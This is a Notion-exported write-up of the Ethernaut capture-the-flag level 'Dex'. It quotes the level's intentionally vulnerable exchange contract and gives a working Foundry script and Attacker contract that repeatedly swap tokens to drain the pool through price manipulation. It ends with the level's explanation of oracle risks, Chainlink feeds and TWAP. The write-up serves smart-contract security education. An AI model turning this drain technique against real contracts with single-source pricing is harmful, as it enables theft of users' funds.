---
title: "Dex"
date: "2024-02-25T10:41:00.000Z"
lastmod: "2024-02-26T13:02:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Shop-b6f28652a23642f2805fd50f577ea02f"
weight: 23
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/22"
next: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "2e8b616a-5bd6-4b05-874e-71b8b4a30ac7"
  created_time: "2024-02-25T10:41:00.000Z"
  last_edited_time: "2024-02-26T13:02:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Shop-b6f28652a23642f2805fd50f577ea02f"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Shop-b6f28652a23642f2805fd50f577ea02f"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 23
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/22"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Dex"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex"
          href: null
  url: "https://www.notion.so/Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
  public_url: null
UPDATE_TIME: "2024-03-07T09:33:38.915Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.


You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.


You will be successful in this level if you manage to drain all of at
 least 1 of the 2 tokens from the contract, and allow the contract to 
report a "bad" price of the assets.


### Quick note


Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)`
 instead of calling the tokens directly, and it will automatically 
approve spending the two tokens by the desired amount. Feel free to 
ignore the `SwappableToken` contract otherwise.


Things that might help:

- How is the price of the token calculated?
- How does the `swap` method work?
- How do you `approve` a transaction of an ERC20?
- Theres more than one way to interact with a contract!
- Remix might help
- What does "At Address" do?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,Dex,IERC20} from '../src/22.sol';

contract POC is Script {

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_22");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker(addr);

        IERC20 t1 = IERC20(attacker.token1());
        IERC20 t2 = IERC20(attacker.token2());

        t1.transfer(address(attacker), 10);
        t2.transfer(address(attacker), 10);

        uint i = attacker.attack();

        console.log('Balance token1: %s', t1.balanceOf(addr));
        console.log('Balance token2: %s', t2.balanceOf(addr));
        console.log('Iteration count: %s', i);

        vm.stopBroadcast();

    }
}

```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Dex {
  function swap(address from, address to, uint amount) external;
  function token1() external returns(address);
  function token2() external returns(address);
  function approve(address spender, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
}

interface IERC20 {
  function transfer(address to, uint256 value) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

contract Attacker {
  address public dex;
  address public token1;
  address public token2;

  constructor(address _dex) {
    dex = _dex;
    token1 = Dex(dex).token1();
    token2 = Dex(dex).token2();
  }

  function getAmount(uint _startAmount, address _from, address _to) public view returns(uint finalAmount){
    finalAmount = _startAmount;
    Dex d = Dex(dex);
    while (d.getSwapPrice(_from, _to, finalAmount) > 110) {
      finalAmount--;
      if (finalAmount == 0) {
        return 0;
      }
    }
  }

  function attack() public returns(uint i){
    IERC20(token1).transfer(address(dex), 10);
    Dex(dex).approve(address(dex), type(uint).max);

    IERC20 t1 = IERC20(token1);
    IERC20 t2 = IERC20(token2);
    Dex d = Dex(dex);

    while (true) {
      d.swap(token2, token1, getAmount(t2.balanceOf(address(this)), token2, token1));
      if (IERC20(token1).balanceOf(address(dex)) == 0) {
        break;
      }
      d.swap(token1, token2, getAmount(t1.balanceOf(address(this)), token1, token2));
      if (t2.balanceOf(address(dex)) == 0) {
        break;
      }
      i++;
    }
  }
}

```


The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.


You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.


The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.


[Oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72?source=friends_link&sk=d921a38466df8a9176ed8dd767d8c77d) are used to get data into and out of smart contracts.


[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price) are a secure, reliable, way to get decentralized data into your smart 
contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model), [upkeep, actions, and maintainance](https://docs.chain.link/docs/kovan-keeper-network-beta), and unlimited customization.


[Uniswap TWAP Oracles](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.


Here is an example of getting the price of Bitcoin in USD from a Chainlink data feed (on the Sepolia testnet):


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {
    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Sepolia
     * Aggregator: BTC/USD
     * Address: 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
     */
    constructor() {
        priceFeed = AggregatorV3Interface(
            0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
        );
    }

    /**
     * Returns the latest price.
     */
    function getLatestPrice() public view returns (int) {
        // prettier-ignore
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```


[Try it on Remix](https://remix.ethereum.org/#url=https://docs.chain.link/samples/PriceFeeds/PriceConsumerV3.sol) Check the Chainlink feed [page](https://data.chain.link/ethereum/mainnet/crypto-usd/btc-usd) to see that the price of Bitcoin is queried from up to 31 different sources.


You can check also, the [list](https://docs.chain.link/data-feeds/price-feeds/addresses/) all Chainlink price feeds addresses.

